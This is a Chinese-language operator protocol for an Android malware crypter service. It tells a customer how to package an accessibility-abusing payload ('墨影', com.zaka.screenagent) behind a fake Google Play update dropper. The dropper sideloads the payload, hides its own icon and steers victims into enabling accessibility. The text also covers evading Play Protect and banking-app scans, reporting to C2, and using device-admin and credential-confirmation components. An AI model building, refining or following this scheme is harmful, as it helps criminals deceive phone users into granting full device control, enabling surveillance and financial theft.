# 喝奶免杀：内层 B 适配协议（墨影 / zaka）

只针对 **喝奶免杀**（`-5364860982`）现在这条 **墨影 4.7 / `com.zaka.screenagent` + `assets/a11y_guide.html`**。  


当前活包：`墨影-4.7.apk`  
`applicationId`：`com.lite.cloudfinder`  
入口：`com.zaka.screenagent.MainActivity`  
无障碍：`com.zaka.screenagent.accessibility.BoundaryAccessibilityService`

壳预设：`play_protect_a11y_slim`。喝奶打包会强制 **A 让路、打开 MainActivity、不走 GATE / PermissionActivity**。

---

## 群里可直接发（B 包必须做到）

1. **桌面入口必须是 `MainActivity`**（MAIN + 声明在 manifest 里，`exported=true`）。不要把启动页改成 Splash / Carrier / OnboardingFgs / PermissionActivity。
2. **无障碍没开时，`MainActivity.onCreate` 必须立刻画出引导卡**（加载 `assets/a11y_guide.html`）。禁止等开机、等「优化中」、先走厂商引导、延时几秒再显示。壳大约 **200ms** 就会把 A 收掉，晚了就是「不跳转引导页」。
3. **不要做「开机不弹引导」**。侧装后第一次被壳打开，就必须是引导页。`墨影-4.7-vc1031-开机不弹引导` 这条会直接和壳打架。
4. **`PermissionActivity` 不是引导页。** 无障碍没开时不要 `finish()`，也不要让它当入口。壳不会去启动它；谁把它当首页，谁就会「打不开」。
5. **无障碍服务的 `android:permission="BIND_ACCESSIBILITY_SERVICE"` 必须写在 `<service>` 标签上**，不要只写在 intent-filter 里。
6. **不要自己 AccJumper / `startActivity` + `finish`。** 壳已经剥掉 B 的桌面 LAUNCHER，点图标是 A 用 `setClassName(包名, MainActivity)` 打开你。入口闪退 = 打不开 App。
7. **`applicationId` 和 `assets/agent_config.json` 的 `packageName` 必须一致。** Java 类可以仍是 `com.zaka.screenagent.*`，但 manifest 里 Activity 全名要能被壳扫到。
8. **KeepAlive / Provider 的 authority 用 `getPackageName()`**，不要写死旧包名。
9. 无障碍 **开启之后** 再进主业务页；没开就停在引导卡，不要空白、不要秒关。

---

## 1. 壳实际怎么跑（B 必须按这个接）

```
用户装 A（桌面图标是 A，名字跟 B）
    → FakeGP 更新页
    → 系统安装器侧装 B（包名保持你上传时的 applicationId）
    → A.launchB()
         setClassName(B包名, MainActivity)
         flags = NEW_TASK | MULTIPLE_TASK | NEW_DOCUMENT | NO_ANIMATION
         先清掉 B 的残留任务，再拉一个新的 MainActivity
    → ~200ms 后 A moveTaskToBack + finish（让路）
    → 屏幕上必须已经是 B 的引导卡
```

壳会做的：

| 项 | 喝奶实际行为 |
|----|----------------|
| 内层包名 | **保持源包名**（Firebase / 你们自己的 C2），不随机换 |
| B 的 `CATEGORY_LAUNCHER` | **剥掉**。桌面图标始终是 A；点图标 = A 再 `setClassName` 打开 MainActivity |
| GATE / AccJumper | **不注入**。引导页必须是你们自己的 HTML |
| A 启动的组件 | **只启动 MainActivity**，绝不启动 `PermissionActivity` |
| 无障碍跳转 | 由 **B 引导卡按钮** 去系统设置；A 不替你跳 |

所以 B 不能依赖「用户从桌面直接点 B 图标」。侧装完成后，**第一次界面必须是 MainActivity 的引导卡**。

---

## 2. Manifest 硬性要求

### 2.1 入口

```xml
<activity
    android:name="com.zaka.screenagent.MainActivity"
    android:exported="true"
    android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

- `MAIN` 必须在 **MainActivity** 上（壳剥 LAUNCHER 后仍靠 MAIN + exported 打开）。
- 类名可以随你们重构改，但改完必须同时满足：apk 里能扫到这个 Activity，且它就是画 `a11y_guide.html` 的那个。
- **不要** `exported="false"`。跨包启动会被 OEM 拒掉，表现就是不跳转。

### 2.2 无障碍服务

```xml
<service
    android:name="com.zaka.screenagent.accessibility.BoundaryAccessibilityService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService"/>
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/…"/>
</service>
```

`BIND_ACCESSIBILITY_SERVICE` 必须在 **service 标签**上。只写在 filter 里，壳扫不到服务，后续统计/针名会对不上。

### 2.3 不要当入口的组件

这些可以留着给厂商流程用，但 **不要带 MAIN/LAUNCHER**，也 **不要在 MainActivity.onCreate 里无条件 start 它们**：

- `perm.PermissionActivity`（无障碍没开时旧逻辑会 `finish()`）
- `flow.*.*CarrierActivity` / `*OnboardingFgs`
- `admin.DeviceAdminActivity`
- `pin.ConfirmCredentialActivity` / `WakeActivity`

---

## 3. 引导页（这是「不跳转」的唯一正解）

`MainActivity` 必须：

1. 在 `onCreate`（`super` 之后马上）判断无障碍是否已开。
2. **没开**：立刻 `WebView.loadUrl("file:///android_asset/a11y_guide.html")`（或等价 `loadData`）。  
   卡片上的开关/按钮再去 `ACTION_ACCESSIBILITY_SETTINGS` 或应用详情。
3. **已开**：进你们的主页面，**不要继续停在引导卡**。
4. 不要 `finish()`。壳 200ms 后会把自己收掉；你再 finish，用户看到的就是桌面或白屏。
5. 不要用「是否冷启动 / 是否开机 / 是否已看过引导」把第一次侧装打开跳过。壳打开 = 必须出引导。

`assets/a11y_guide.html` 文件名不要改。壳靠它识别「这是自带引导的 B」，才不会去注入 GATE。

---

## 4. 为啥老是不跳转 / 打不开（对照你们交过的包）

| 现象 | 常见原因 | 改法 |
|------|----------|------|
| 不跳转引导页 | `开机不弹引导`；MainActivity 先走 Splash/厂商 FGS；引导延时 | 第一次被 start 就出 HTML 卡 |
| 闪一下没了 | `PermissionActivity` 当入口，a11y off 就 `finish()` | 入口永远 MainActivity |
| 打不开 App | MainActivity `onCreate` 里 jump+finish；或 `exported=false` | 站住页面，等用户去开无障碍 |
| 点图标没反应 | 以为 B 还有桌面图标 | 图标是 A；保证 MainActivity 能被 `setClassName` 拉起、不崩 |
| 白屏 | 引导 WebView 太晚才 load；A 已经让路 | `onCreate` 里同步 load，不要 post 几秒 |
| 无障碍开了还停在引导 | 没在 `onServiceConnected` 后切主页 | 开了就切走（壳不会替你关引导卡） |

不要用「裸模式 / 直接申请权限 / 壳兼容」各做一套入口。喝奶只认 **MainActivity + a11y_guide.html** 这一套。

---

## 5. 壳会改、B 不要对抗

- 内层 **targetSdk → 28**、Konfety ZIP、AOSP testkey：为了侧装过 PP。不要再自己套一层壳。
- `INNER_BANK_SAFE` 会剥一部分银行扫描权限（相机/定位/部分 SETTINGS）。不要把「打开 App」绑死在这些权限上。
- 无障碍 label 会被改成 B 的应用名。
- 会往无障碍 `onServiceConnected` 打统计 beacon。不要清掉 `super.onServiceConnected()`。

---

## 6. 交包前自检

卸干净旧 A/B 后，**不要 `adb install` B**。走完整：装 A → 更新/侧装 B → 看第一屏。

过关：

1. 侧装结束，**立刻**出现引导卡（应用名 + 开关），不是空白、不是系统设置、不是厂商向导。
2. 点引导卡能进系统无障碍列表，能找到同名服务。
3. 打开无障碍后，回到 App 是主页面，不是还停在引导卡、也不是闪退。
4. 回桌面点图标，还能再打开（A 再拉 MainActivity），不能「点了没反应」。

---

## 7. 隔离


- `pack_service` 在 `finally` 里按打包前快照恢复环境变量。

---

## 8. 代码位置

| 文件 | 内容 |
|------|------|
| `bot_store.py` | `HENAI_CHAT_ID` |
| `pack_service.py` | 喝奶才开 `HENAI_B` + stock yield，并 restore |
| `apk_packer.py` | 识别 `a11y_guide.html` / MainActivity；A 不启动 PermissionActivity |
| `b_obfuscator.py` | `_stock_inapp_guide`：喝奶跳过 GATE |
| `patch_lib_dex.py` | A `setClassName` → MainActivity，~200ms RevealB 让路 |
